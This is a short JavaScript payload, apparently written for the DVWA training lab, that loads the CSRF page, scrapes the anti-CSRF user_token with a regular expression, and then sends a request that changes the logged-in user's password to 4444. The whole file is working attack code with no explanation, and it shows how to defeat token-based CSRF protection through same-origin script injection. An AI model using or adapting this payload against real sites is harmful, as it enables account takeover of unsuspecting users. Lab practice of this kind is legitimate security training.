var xhr = new XMLHttpRequest(),
  method = 'GET',
  url = 'http://dvwa.localtest/vulnerabilities/csrf/'

xhr.open(method, url, true)
xhr.onreadystatechange = function () {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    console.log(xhr.responseText)
    const csrfPage = xhr.responseText
    const token = csrfPage.match(/'user_token' value='(.*)'/i)[1]
    const password = 4444
    const url = `http://dvwa.localtest/vulnerabilities/csrf/?password_new=${password}&password_conf=${password}&Change=Change&user_token=${token}`
    const xhrUpdatePwd = new XMLHttpRequest()
    xhrUpdatePwd.open('GET', url, true)
    xhrUpdatePwd.onreadystatechange = function () {
      if (xhrUpdatePwd.readyState === XMLHttpRequest.DONE && xhrUpdatePwd.status === 200) {
        console.log(xhrUpdatePwd.responseText)
      }
    }
    xhrUpdatePwd.send()
  }
}
xhr.send()
